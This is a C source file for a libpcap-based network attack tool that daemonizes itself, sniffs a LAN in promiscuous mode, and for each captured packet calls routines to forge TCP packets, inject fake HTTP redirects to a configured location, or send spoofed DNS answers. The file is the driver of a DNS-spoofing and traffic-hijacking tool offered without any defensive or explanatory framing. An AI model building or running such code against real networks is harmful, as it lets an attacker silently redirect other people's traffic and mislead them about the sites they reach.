#include <assert.h>
#include <arpa/inet.h>
#include <string.h>

#include "pcap_main.h"
#include "net_hdr.h"
#include "raw_tcp.h"
#include "dns_packet.h"

u8 dst_mac[6] = {0xf0,0xde,0xf1,0xe4,0x5a,0x9d};
unsigned rev_addr;	
unsigned rev_mask;
char location[100];

void daemonize()
{
    pid_t pid;
    int fd;

    if (0 < (pid = fork()))
        exit(0); 
    else if (pid < 0) {
        printf("fork error!\n");
        exit(1); 
    }
    setsid(); 
    
    if (0 < (pid = fork()))
        exit(0);
    else if (pid < 0) {
        printf("fork error!\n");
        exit(1); 
    }

    fd = open("/dev/null", O_WRONLY);
    close(0);
    dup2(fd, 0);

    close(1);
    dup2(fd, 1);

    close(2);
    dup2(fd, 2);

    close(fd);
	
    chdir("/tmp");
    umask(0); 

    return;
}

static inline u8 *pkb_pull(u8*pkb,u32 * pkb_len, u16 len)
{
    /* AP_ASSERT(pkb->len > len); */
    if (*pkb_len >= len) {
        *pkb_len -= len;
        return pkb += len;
    } else
        return NULL;
}


static u8 * decode_tcp_packet(u16 tot_len,u8 * tcp_packet,TCP_NEED *tcp){
	struct tcphdr *tcp_hdr = (struct tcphdr * )tcp_packet;
	
	tcp ->src_port = ntohs(tcp_hdr ->source);
	tcp ->des_port = ntohs(tcp_hdr ->dest);
	tcp ->ack_seq = ntohl(tcp_hdr ->ack_seq);
	tcp ->seq = ntohl(tcp_hdr ->seq);

	u16 content_length = tot_len - (tcp_hdr ->doff <<2);
	u16 * p_total = & tot_len;
	u8 *content = pkb_pull(tcp_packet,(u32 *)p_total, tcp_hdr->doff <<2);
	tcp ->expect_seq = calcu_ab_seq(tcp ->seq , content_length);
	
	printf("the content_length is %d %x %x !\n",content_length,tcp ->seq,tcp ->expect_seq);
	
	
	return content;
}


static int decode_udp_packet(u16 tot_len, u8 *udp_packet,UDP_NEED *udp ,DNS_NEED *p_need){
	struct udphdr *udp_hdr = (struct udphdr *)udp_packet;

	udp ->des_port = ntohs(udp_hdr ->dest);
	udp ->src_port = ntohs(udp_hdr ->source);
	u16 len = ntohs(udp_hdr ->len);
	
	u8 *content = udp_packet + 8;
	u16 content_length = len -8;
	assert(content_length < tot_len);
	
	printf("the content_length is %d  !\n",content_length);

	if (udp ->des_port == DNS_PORT ){
		if (show_dns_requset(content,content_length,p_need)){
			printf("fake_packet error %s %d\n",__FUNCTION__,__LINE__);
			return -1;
		}
	}
	
	return 0;
}

int decode_packet_lan(u8 *pkb,u32 packet_len,char *dev_name)
{
    /* free ressamble buffer */
    struct ethhdr *ethdr = NULL;
    struct iphdr  *iphdr = NULL;
    u16 proto;
    assert(pkb);

    u8 *temp = NULL;
    
    /* L2 MAC */
    ethdr = (struct ethhdr *)pkb;
    temp = pkb_pull(pkb,&packet_len, ETH_HLEN);
    if (!temp){
		printf("the packet is not usual!\n");
		return -1;
    }
   
    proto = ntohs(ethdr->h_proto);
	
    if (proto < 1536)
        return  -1;


    if (proto != ETH_P_IP){   /*h_proto != ETH_P_IP*/
	printf("not ip proto!\n");
	return -1;
	}

    /*L3*/
    iphdr = (struct iphdr *)temp;

    if (iphdr->version != 4 || iphdr->ihl < 5 || 
        !(temp =pkb_pull(temp,&packet_len,iphdr->ihl * 4))) {
        return    -1;
    }

/* 
*@brief do 3 thing before forge the packet
*@1,get the sorce and dest ip address
*@2,get the soce and dest port
*@3,may be get the tcp seq
*/
	IP_NEED ip;
	memset(&ip,0,sizeof(IP_NEED));
	
	ip.src = ntohl(iphdr ->saddr);
	ip.det = ntohl(iphdr ->daddr);
	ip.tot_len = ntohs(iphdr ->tot_len) ;

	/*L4 to store the nesssary infomation*/	
	TCP_NEED tcp;
	memset(&tcp,0,sizeof(TCP_NEED));
	UDP_NEED udp;
	memset(&udp,0,sizeof(UDP_NEED));

	DNS_NEED ds_need = {};
	memset(&ds_need,0,sizeof(DNS_NEED));

	switch (iphdr ->protocol ){
		case IPPROTO_TCP:
			temp = decode_tcp_packet(ip.tot_len - iphdr->ihl*4,temp,&tcp);
#ifndef HTTP_REDIRET
			if (fake_packet(&tcp,&ip,ethdr,dev_name)){
				printf("fake_packet error %s %d\n",__FUNCTION__,__LINE__);
				return -1;
			}
#else
			if (!strstr((char*)temp,"Host: www.baidu.com\r\n")){
				if (fake_http_redirect_packet(&tcp,&ip,ethdr,dev_name)){
					printf("fake_packet error %s %d\n",__FUNCTION__,__LINE__);
					return -1;
				}
			}
#endif
			break;
		case IPPROTO_UDP:
			decode_udp_packet(ip.tot_len - iphdr->ihl*4,temp,&udp,&ds_need);

			if (ds_need.flag == 0){/* 0 request ;1 answer;*/
				if ( fake_dns_packet(&ds_need,&udp,&ip,ethdr,dev_name)){
					printf("fake dns packet error %s %d\n",__FUNCTION__,__LINE__);
					return -1;
				}
			}
			break;
		default:
			printf("NOT TCP or UDP PROTO!%s %d\n",__FUNCTION__,__LINE__);
			break;
    		}

   	 return 0;
}

void packet_capture(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
 	//int * id = (int *)arg;
  	char *dev_name = (char *)arg; 
#if 0 	
  	printf("Packet length: %d\n", pkthdr->len);
 	printf("capture of bytes: %d\n", pkthdr->caplen);
  	printf("Recieved time: %s", ctime((const time_t *)&pkthdr->ts.tv_sec)); 
#endif
	if (decode_packet_lan((u8 *)packet, pkthdr ->len,dev_name)){
		perror("decode packet occur something wrong!\n");
	}
}

#if 0
static  void useage(){   
 	printf( 
		"-d Destination URL or IPv6 address\n"
		"-p destion_port \n"
		"-i as : -i eth0\n"         
 		"-h show help\n");
}

static int parse_options(int argc, char **argv){	
	int ch;    
	opterr = 0;        
	while (-1 != (ch = getopt(argc, argv, "d:p:i:h"))) {
	switch(ch){  
		case 'd': 
			strcpy(target,optarg); 
				break;                    
		case 'p':            
			if (!(dest_port = atoi (optarg)))				
				return -1;        
				break;        
		case 'i':           	
				strcpy(interface0,optarg);        
				break;        
		case 'h':            
				useage();            
				break;        
		case '?':        
			default:            
		printf("wrong parameter.\n");            
		return -1;        
		}    
	}    
	return 0;
}
#endif 

int main(int argc,char ** argv)
{
  	char errBuf[PCAP_ERRBUF_SIZE], * devStr;
	
#if 0
  	if (parse_options(argc, argv)){
		printf("parse falid!%s %d\n",__FUNCTION__,__LINE__);	
		return -1;
	};
#endif
	char fiter[1024] = {0};
	char *p_tr = fiter;
	unsigned int addr = MK_ADDR(10,10,133,0);	
	unsigned int mask = MK_ADDR(255,255,255,0);	
	
	rev_addr = REVERSE_ADDR(addr);	
	rev_mask = REVERSE_ADDR(mask);
/*open the config file read the Filter*/
	FILE *fp = NULL;
	if (!(fp = fopen("./fiter.cfg","r"))){
		printf("open the file falid! %s %d \n",__FUNCTION__,__LINE__);
		return -1;
	}

	if(!fgets(fiter,1023,fp)){
		fprintf(stderr,"fets occur somthing wrong !");
		return -1;
	}
#ifdef HTTP_REDIRET
	p_tr = strstr(fiter,"LOCATION:");

	if (p_tr){
		*p_tr = '\0';
		snprintf(location,100,"%s",p_tr + 9 );	
		printf("the location is %s ,the len is %d\n",location,(int)strlen(location));
	}
	else{
		p_tr = fiter;
		while (*p_tr && *p_tr != '\r' && *p_tr !='\n'){
			p_tr ++;
		}
		*p_tr = '\0';
	}
#else
	while (*p_tr && *p_tr != '\r' && *p_tr !='\n' && *p_tr !='L'){
			p_tr ++;
		}
	*p_tr = '\0';
#endif
	fclose(fp);

	char *FILER = NULL;
	int len = strlen(fiter);
	if (!(FILER = malloc (len + 1 ))){
		printf("malloc the mem  falid! %s %d \n",__FUNCTION__,__LINE__);
		return -1;
	}
	memcpy(FILER,fiter,len+1);
	printf("filter = %s  len= %d\n",FILER,(int)strlen(FILER));

	daemonize();
  /* get a device */
  	devStr = pcap_lookupdev(errBuf);
  
  	if(devStr)
  	{
    		printf("success: device: %s\n", devStr);
  	}
  	else
  	{
    		printf("error: %s %s %d\n", errBuf,__FUNCTION__,__LINE__);
    		return -1;
  	}
  
  /* open a device, wait until a packet arrives */
  	pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf);
  
  	if(!device)
  	{
    		printf("error: pcap_open_live(): %s %s %d\n", errBuf,__FUNCTION__,__LINE__);
    		return -1;
  	}
  
  /* construct a filter */
  
  	struct bpf_program filter;
  	if (pcap_compile(device, &filter, FILER, 1, 0)){
		printf("pcap_compile error %s %d\n",__FUNCTION__,__LINE__);
		return -1;
	}
  	if (pcap_setfilter(device, &filter)){
		printf("pcap_setfolter error %s %d\n",__FUNCTION__,__LINE__);
		return -1;
	}
	
	free(FILER);

  /*    if the second parameter is negative wait loop forever*/
  	pcap_loop(device, -1, packet_capture, (u_char*)devStr);

	pcap_close(device);
	
  	return 0;
}
